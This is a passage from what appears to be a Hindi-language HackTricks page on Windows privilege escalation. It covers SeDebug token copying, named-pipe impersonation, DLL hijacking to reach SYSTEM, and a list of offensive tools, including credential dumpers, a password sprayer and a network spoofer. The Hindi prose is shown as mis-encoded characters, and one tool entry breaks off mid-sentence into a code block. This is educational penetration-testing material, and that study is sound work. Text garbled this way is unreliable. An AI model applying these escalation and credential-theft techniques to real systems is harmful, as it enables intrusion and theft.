рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╡рд╣ рдЯреЛрдХрди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реИрдВ (рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдЖрдк рдЗрд╕реЗ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЙрдЪреНрдЪ рдЕрд╡рдзрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдкрд╛рдПрдВрдЧреЗ), рддреЛ рдЖрдк **SeDebug рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЗ рд╕рд╛рде рд▓рдЧрднрдЧ рдХрд┐рд╕реА рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЦреЛрд▓ рд╕рдХреЗрдВрдЧреЗ** (рд╕рдВрд░рдХреНрд╖рд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ рдирд╣реАрдВ) , рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдЯреЛрдХрди **рдХреЙрдкреА** рдХрд░реЗрдВ, рдФрд░ рдЙрд╕ рдЯреЛрдХрди рдХреЗ рд╕рд╛рде **рдПрдХ рдЕрдирд┐рдпрдорд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрдирд╛ рд╕рдХреЗрдВ**ред\
рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рд╛рдорд╛рдиреНрдпрдд: **рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣реА рдХрд┐рд╕реА рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЪреБрдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕рднреА рдЯреЛрдХрди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реЛрддреЗ рд╣реИрдВ** (_рд╣рд╛рдВ, рдЖрдк рд╕рднреА рдЯреЛрдХрди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдмрд┐рдирд╛ рд╕рд┐рд╕реНрдЯрдо рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ_)ред\
**рдЖрдк** [**рдпрд╣рд╛рдБ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рддрдХрдиреАрдХ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХреЛрдб рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ**](sedebug-+-seimpersonate-copy-token.md)**ред**

### **Named Pipes**

рдпрд╣ рддрдХрдиреАрдХ рдореАрдЯрд░рдкреНрд░реЗрдЯрд░ рджреНрд╡рд╛рд░рд╛ `getsystem` рдореЗрдВ рдЙрдиреНрдирддрд┐ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИред рддрдХрдиреАрдХ рдЙрд╕ рдкрд╛рдЗрдк рдХреЛ рдмрдирд╛рдиреЗ рдФрд░ рдлрд┐рд░ рдЙрд╕ рдкрд╛рдЗрдк рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реЗрд╡рд╛ рдмрдирд╛рдиреЗ/рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИред рдлрд┐рд░, рдкрд╛рдЗрдк рдХреНрд▓рд╛рдЗрдВрдЯ (рд╕реЗрд╡рд╛) рдХреЗ рдЯреЛрдХрди рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд░рдЦрдиреЗ рд╡рд╛рд▓рд╛ **рд╕рд░реНрд╡рд░** рдЬреЛ **`SeImpersonate`** рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрд╛рдЗрдк рдмрдирд╛рдпрд╛ рдерд╛, рд╕рд┐рд╕реНрдЯрдо рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧрд╛ред\
рдпрджрд┐ рдЖрдк [**рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рдХреНрд▓рд╛рдЗрдВрдЯ рдЕрдиреБрдХрд░рдг рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рдЗрд╕реЗ рдкрдврд╝рдирд╛ рдЪрд╛рд╣рд┐рдП**](./#named-pipe-client-impersonation)ред\
рдпрджрд┐ рдЖрдк [**рдЙрдЪреНрдЪ рдЕрд╡рдзрд┐ рд╕реЗ рд╕рд┐рд╕реНрдЯрдо рддрдХ рдЬрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреИрд╕реЗ рдЬрд╛рдПрдВ рдЗрд╕рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдкрдврд╝рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рдЗрд╕реЗ рдкрдврд╝рдирд╛ рдЪрд╛рд╣рд┐рдП**](from-high-integrity-to-system-with-name-pipes.md)ред

### Dll Hijacking

рдпрджрд┐ рдЖрдк **SYSTEM** рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣реА рдХрд┐рд╕реА **рдкреНрд░рдХреНрд░рд┐рдпрд╛** рджреНрд╡рд╛рд░рд╛ **рд▓реЛрдб** рдХрд┐рдП рдЬрд╛ рд░рд╣реЗ **рдПрдХ dll рдХреЛ рд╣рд╛рдЗрдЬреИрдХ** рдХрд░ рд▓реЗрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдЙрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рд╡рд┐рдЪрд╛рд░рд╢реАрд▓ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХреЗрдВрдЧреЗред рдЗрд╕рд▓рд┐рдП Dll Hijacking рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ рдХреЗ рд▓рд┐рдП рднреА рдЙрдкрдпреЛрдЧреА рд╣реИ, рдФрд░, рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдЙрдЪреНрдЪ рдЕрд╡рдзрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдмрд╣реБрдд **рдЖрд╕рд╛рди рд╣реЛрдЧрд╛** рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕реЗ **dlls рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдлреЛрд▓реНрдбрд░реЛрдВ рдкрд░ рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реЛрдВрдЧреАред\
**рдЖрдк** [**рдпрд╣рд╛рдБ Dll рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВ**](dll-hijacking.md)**ред**

### **From Administrator or Network Service to System**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**рдкрдврд╝реЗрдВ:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## рдЕрдзрд┐рдХ рдорджрдж

[рд╕реНрдерд┐рд░ рдЗрдореНрдкреИрдХреЗрдЯ рдмрд╛рдЗрдирд░реА](https://github.com/ropnop/impacket\_static\_binaries)

## рдЙрдкрдпреЛрдЧреА рдЙрдкрдХрд░рдг

**Windows рд╕реНрдерд╛рдиреАрдп рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ рд╡реЗрдХреНрдЯрд░реНрд╕ рдХреЗ рд▓рд┐рдП рд╕рд░реНрд╡рд╢реНрд░реЗрд╖реНрда рдЙрдкрдХрд░рдг:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- рдорд┐рд╕рдХреЙрдиреНрдлрд┐рдЧрд░реЗрд╢рди рдФрд░ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдлрд╝рд╛рдЗрд▓реЗрдВ рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪ рдХрд░реЗрдВ (**[**рдпрд╣рд╛рдБ рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**](../../windows/windows-local-privilege-escalation/broken-reference/)**). рдЦреЛрдЬрд╛ рдЧрдпрд╛ред**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- рдХреБрдЫ рд╕рдВрднрд╛рд╡рд┐рдд рдорд┐рд╕рдХреЙрдиреНрдлрд┐рдЧрд░реЗрд╢рди рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдФрд░ рдЬрд╛рдирдХрд╛рд░реА рдПрдХрддреНрд░ рдХрд░реЗрдВ (**[**рдпрд╣рд╛рдБ рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**](../../windows/windows-local-privilege-escalation/broken-reference/)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- рдорд┐рд╕рдХреЙрдиреНрдлрд┐рдЧрд░реЗрд╢рди рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- рдпрд╣ PuTTY, WinSCP, SuperPuTTY, FileZilla, рдФрд░ RDP рд╕рд╣реЗрдЬреЗ рдЧрдП рд╕рддреНрд░ рд╕реВрдЪрдирд╛ рдирд┐рдХрд╛рд▓рддрд╛ рд╣реИред рд╕реНрдерд╛рдиреАрдп рдореЗрдВ -Thorough рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдореИрдиреЗрдЬрд░ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдирд┐рдХрд╛рд▓рддрд╛ рд╣реИред рдЦреЛрдЬрд╛ рдЧрдпрд╛ред**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- рдбреЛрдореЗрди рдореЗрдВ рдмрд┐рдЦрд░реЗ рд╣реБрдП рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рд╕реНрдкреНрд░реЗ рдХрд░реЗрдВ**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh рдПрдХ PowerShell ADIDNS/LLMNR/mDNS/NBNS рд╕реНрдкреВрдлрд░ рдФрд░ рдореИрди-рдЗрди-рдж-рдорд┐рдбрд▓ рдЙрдкрдХрд░рдг рд╣реИред**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- рдореВрд▓ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ Windows рдЬрд╛рдВрдЪ**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- рдЬреНрдЮрд╛рдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рджреБрд░реБрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рдЦреЛрдЬреЗрдВ (Watson рдХреЗ рд▓рд┐рдП рдкреБрд░рд╛рдирд╛) \
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- рд╕реНрдерд╛рдиреАрдп рдЬрд╛рдВрдЪреЗрдВ **(рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЕрдзрд┐рдХрд╛рд░ рдЪрд╛рд╣рд┐рдП)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- рдЬреНрдЮрд╛рдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рджреБрд░реБрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рдЦреЛрдЬреЗрдВ (рд╡рд┐рдЬреБрдЕрд▓ рд╕реНрдЯреВрдбрд┐рдпреЛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ) ([**рдкреВрд░реНрд╡-рдХрдВрдкрд╛рдЗрд▓**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- рдорд┐рд╕рдХреЙрдиреНрдлрд┐рдЧрд░реЗрд╢рди рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрд╕реНрдЯ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ (рдПрдХ рдЬрд╛рдВрдЪ рдЬрд╛рдирдХрд╛рд░реА рдЙрдкрдХрд░рдг рд╕реЗ рдЕрдзрд┐рдХ рд╣реИ) (рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ) **(**[**рдкреВрд░реНрд╡-рдХрдВрдкрд╛рдЗрд▓**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- рдмрд╣реБрдд рд╕рд╛рд░реЗ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдирд┐рдХрд╛рд▓рддрд╛ рд╣реИ (рдЧрд┐рдЯрд╣рдм рдореЗрдВ рдкреВрд░реНрд╡-рдХрдВрдкрд╛рдЗрд▓ рдПрдХреНрд╕реЗ)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- C# рдореЗрдВ PowerUp рдХрд╛ рдкреЛрд░реНрдЯ**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- рдорд┐рд╕рдХреЙрдиреНрдлрд┐рдЧрд░реЗрд╢рди рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ (рдЧрд┐рдЯрд╣рдм рдореЗрдВ рдкреВрд░реНрд╡-рдХрдВрдкрд╛рдЗрд▓ рдПрдХреНрд╕реЗрдХреНрдпреВрдЯреЗрдмрд▓)ред рд╕рд┐рдлрд╛рд░рд┐рд╢ рдирд╣реАрдВ рдХреА рдЬрд╛рддреАред рдпрд╣ рд╡рд┐рдВрдбреЛрдЬ 10 рдореЗрдВ рдЕрдЪреНрдЫреЗ рд╕реЗ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- рд╕рдВрднрд╛рд╡рд┐рдд рдорд┐рд╕рдХреЙрдиреНрдлрд┐рдЧрд░реЗрд╢рди рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ (рдкрд╛рдпрдерди рд╕реЗ рдПрдХреНрд╕реЗ)ред рд╕рд┐рдлрд╛рд░рд┐рд╢ рдирд╣реАрдВ рдХреА рдЬрд╛рддреАред рдпрд╣ рд╡рд┐рдВрдбреЛрдЬ 10 рдореЗрдВ рдЕрдЪреНрдЫреЗ рд╕реЗ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред

**рдмреИрдЯ**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- рдЗрд╕ рдкреЛрд╕реНрдЯ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдЙрдкрдХрд░рдг рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ (рдпрд╣ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕реЗрд╕рдЪреЗрдХ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ рд▓реЗрдХрд┐рди рдпрд╣ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИ)ред

**рд╕реНрдерд╛рдиреАрдп**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ рдкрдврд╝рддрд╛ рд╣реИ рдФрд░ рдХрд╛рдо рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд░рддрд╛ рд╣реИ (рд╕реНрдерд╛рдиреАрдп рдкрд╛рдпрдерди
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## рд╕рдВрджрд░реНрдн

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрди рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреЛ рдкреАрдбреАрдПрдл рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдПрдХреНрд╕реЗрд╕ рдЪрд╛рд╣рд┐рдП**? [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**рдж рдкреАрдПрдПрд╕ рдкрд░рд┐рд╡рд╛рд░**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**рдПрдирдПрдлрдЯреАрдЬрд╝**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ рдкреАрдПрдПрд╕ рдФрд░ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВ ЁЯРж[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд░реЗрдкреЛ** рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ [**рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕-рдХреНрд▓рд╛рдЙрдб рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud)ред

</details>
